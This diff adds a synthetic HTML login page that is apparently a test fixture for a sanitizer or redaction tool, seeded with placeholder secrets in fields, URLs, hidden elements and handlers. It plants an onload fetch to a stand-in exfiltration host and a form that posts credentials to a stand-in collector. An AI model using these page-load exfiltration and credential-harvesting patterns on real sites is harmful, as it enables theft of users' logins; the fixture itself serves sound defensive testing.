@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <title>Fixture Organization — synthetic login</title>
+  <script src="https://scripts.fixture.test/load.js">throw new Error("must never execute");</script>
+  <style>.private {display: none}</style>
+</head>
+<body onload="fetch('https://exfil.fixture.test/')">
+  <h1>Fixture Organization</h1>
+  <p>SYNTHETIC TEST PAGE. Not a real organization or research sample.</p>
+  <form action="https://collector.fixture.test/submit?token=SECRET_QUERY" method="post">
+    <label>Account <input type="email" name="account" value="SECRET_ACCOUNT"></label>
+    <label>Password <input type="password" name="password" value="SECRET_PASSWORD"></label>
+    <textarea name="note">SECRET_NOTE</textarea>
+    <div contenteditable="true">SECRET_EDITABLE<span>SECRET_NESTED</span></div>
+    <button formaction="/alternative?otp=SECRET_OTP" onclick="alert('SECRET_HANDLER')">Sign in</button>
+  </form>
+  <a href="/help?user=SECRET_USER#SECRET_FRAGMENT">Help</a>
+  <a href="https://news.fixture.test/article">External article</a>
+  <iframe src="https://pages.fixture.test/widget?session=SECRET_SESSION" srcdoc="SECRET_SRCDOC"></iframe>
+  <img src="/logo.svg" alt="Fixture logo">
+  <p hidden>SECRET_HIDDEN</p>
+  <!-- SECRET_COMMENT -->
+</body>
+</html>
